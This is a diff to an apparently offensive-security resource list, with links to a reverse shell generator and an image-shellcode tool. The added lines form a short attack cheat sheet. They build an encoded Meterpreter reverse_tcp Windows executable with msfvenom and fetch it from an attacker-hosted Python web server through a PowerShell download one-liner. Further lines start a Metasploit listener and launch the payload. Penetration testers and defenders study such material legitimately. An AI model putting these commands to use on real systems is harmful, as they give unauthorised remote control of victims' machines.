@@ -17,6 +17,26 @@ Wide collection of tools, links, informations
 **Online Reverse Shell generator**
 - https://www.revshells.com/
 
+
+*Create Payload with MSFVenom*
+  msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+*Upload Payload via PS & Fileserver*
+  powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+*Open Meterpreter listener*
+  use exploit/multi/handler 
+  set PAYLOAD windows/meterpreter/reverse_tcp 
+  set LHOST your-ip 
+  set LPORT listening-port 
+  run
+  
+* Start Process*
+  Start-Process "shell-name.exe"
+  
+  *Spawn webserver*
+  python3 -m http.server [PORT]
+
 **Don't kill my cat** 
 A tool that generates obfuscated shellcode that is stored inside of polyglot images. 
 - https://github.com/Mr-Un1k0d3r/DKMC
